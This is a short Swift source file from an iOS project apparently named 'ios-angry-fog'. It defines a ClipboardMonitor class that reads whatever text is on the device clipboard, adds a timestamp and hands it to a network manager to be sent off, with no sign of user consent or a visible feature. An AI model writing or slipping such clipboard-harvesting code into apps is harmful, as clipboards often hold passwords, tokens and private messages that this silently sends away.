//
//  ClipboardMonitor.swift
//  ios-angry-fog
//
//  Created by Mariia Glushenkova on 28.4.2025.
//


import UIKit
class ClipboardMonitor {
    static func checkClipboardAndSend() {
        let clipboard = UIPasteboard.general.string ?? "Nothing"
        let timestamp = ISO8601DateFormatter().string(from: Date())

        let payload: [String: Any] = [
            "type": "clipboard",
            "content": clipboard,
            "timestamp": timestamp
        ]

        NetworkManager.sendData(dict: payload)
    }
}
